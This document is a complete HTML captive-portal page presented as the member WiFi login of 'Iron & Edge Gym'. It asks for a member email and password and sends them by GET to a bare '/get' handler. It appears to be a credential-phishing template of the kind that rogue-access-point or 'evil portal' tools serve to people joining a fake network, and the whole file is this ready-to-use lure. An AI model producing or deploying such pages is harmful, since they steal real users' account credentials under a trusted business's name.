<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Iron & Edge Gym — Member WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0a0a0a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#111;border-radius:12px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,0.6)}
.top{background:#0d0d0d;padding:28px 24px 20px;border-bottom:2px solid #FFD700;text-align:center}
.gym-name{font-size:24px;font-weight:900;color:#fff;letter-spacing:2px;text-transform:uppercase}
.gym-name span{color:#FFD700}
.gym-sub{font-size:9px;color:#555;letter-spacing:3px;text-transform:uppercase;margin-top:6px}
.status{background:#0a0a0a;padding:7px 24px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #1a1a1a}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.status span{font-size:11px;color:#444}
.status strong{color:#FFD700;font-weight:600}
.body{padding:24px}
h2{font-size:17px;font-weight:800;color:#e0e0e0;letter-spacing:0.5px;margin-bottom:3px}
.sub{font-size:12.5px;color:#555;margin-bottom:18px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#444;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1px solid #1e1e1e;border-radius:8px;font-size:14.5px;background:#0a0a0a;color:#e0e0e0}
input:focus{outline:none;border-color:#FFD700;box-shadow:0 0 0 3px rgba(255,215,0,0.1)}
input::placeholder{color:#2a2a2a}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:8px;background:#FFD700;color:#0a0a0a;font-size:13px;font-weight:900;letter-spacing:1px;text-transform:uppercase;cursor:pointer}
.terms{font-size:11px;color:#333;text-align:center;margin-top:13px;line-height:1.6}
.terms a{color:#FFD700}
.foot{background:#0a0a0a;border-top:1px solid #1a1a1a;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#333;text-decoration:none}
.foot a{color:#FFD700}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="gym-name">Iron <span>&amp;</span> Edge</div>
    <div class="gym-sub">Performance Gym &bull; Member WiFi</div>
  </div>
  <div class="status"><div class="dot"></div><span>Network: <strong>IronEdge-Members</strong></span></div>
  <div class="body">
    <h2>Member Sign In</h2>
    <p class="sub">Access our high-speed network during your training session.</p>
    <form action="/get">
      <label class="lbl">Member Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect</button>
      <p class="terms">By connecting you agree to our <a href="#">Member WiFi Policy</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Iron &amp; Edge Gym</span><a href="#">Help</a></div>
</div>
</body>
</html>
